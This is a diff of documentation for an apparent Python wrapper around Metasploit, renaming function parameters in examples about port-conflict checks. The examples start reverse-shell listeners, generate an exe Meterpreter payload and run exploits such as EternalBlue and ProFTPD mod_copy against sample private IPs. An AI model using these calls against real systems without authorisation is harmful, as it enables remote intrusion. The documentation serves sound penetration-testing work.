@@ -50,7 +50,7 @@ When starting a standalone listener (for generated payloads or persistent handle
 
 ```python
 result = await start_listener(
-    payload_type="windows/meterpreter/reverse_tcp",
+    payload="windows/meterpreter/reverse_tcp",
     lhost="10.0.0.1",
     lport=4444  # Port is checked before binding
 )
@@ -70,9 +70,9 @@ When running exploits with reverse payloads:
 
 ```python
 result = await run_exploit(
-    module_name="exploit/unix/ftp/proftpd_modcopy_exec",
+    module="exploit/unix/ftp/proftpd_modcopy_exec",
     options={"RHOSTS": "192.168.1.100"},
-    payload_name="cmd/unix/reverse_perl",
+    payload="cmd/unix/reverse_perl",
     payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}  # Port is checked
 )
 ```
@@ -91,8 +91,8 @@ When generating payloads (non-blocking, just a warning):
 
 ```python
 result = await generate_payload(
-    payload_type="windows/meterpreter/reverse_tcp",
-    format_type="exe",
+    payload="windows/meterpreter/reverse_tcp",
+    format="exe",
     options={"LHOST": "10.0.0.1", "LPORT": 4444}  # Port is checked
 )
 ```
@@ -112,11 +112,11 @@ The check respects the `ReverseListenerBindAddress` and `ReverseListenerBindPort
 ```python
 # Example: Check port 8080 on localhost only
 result = await start_listener(
-    payload_type="windows/meterpreter/reverse_tcp",
+    payload="windows/meterpreter/reverse_tcp",
     lhost="192.168.1.100",  # External IP advertised to target
     lport=4444,
-    reverse_listener_bind_address="127.0.0.1",  # Bind only to localhost
-    reverse_listener_bind_port=8080  # Use different port for binding
+    reverselistenerbindaddress="127.0.0.1",  # Bind only to localhost
+    reverselistenerbindport=8080  # Use different port for binding
 )
 # Checks: 127.0.0.1:8080 (not 0.0.0.0:4444)
 ```
@@ -132,7 +132,7 @@ tcp6  0  0 :::80  :::*  LISTEN  1234/apache2
 
 # Try to start listener on port 80
 await start_listener(
-    payload_type="cmd/unix/reverse_bash",
+    payload="cmd/unix/reverse_bash",
     lhost="10.0.0.1",
     lport=80
 )
@@ -168,9 +168,9 @@ await start_listener("windows/meterpreter/reverse_tcp", "10.0.0.1", 4444)
 
 # Try to run exploit with same port (will fail!)
 await run_exploit(
-    module_name="exploit/windows/smb/ms17_010_eternalblue",
+    module="exploit/windows/smb/ms17_010_eternalblue",
     options={"RHOSTS": "192.168.1.10"},
-    payload_name="windows/meterpreter/reverse_tcp",
+    payload="windows/meterpreter/reverse_tcp",
     payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}
 )
 # Error: Port 4444 already in use
@@ -235,7 +235,7 @@ Port checks are fast (< 1ms typically) and non-blocking:
 
 **Cause:** The port might be bound to a specific interface that you're checking.
 
-**Solution:** Try binding to a specific interface with `reverse_listener_bind_address`.
+**Solution:** Try binding to a specific interface with `reverselistenerbindaddress`.
 
 ### Port check passes but Metasploit fails to bind
 
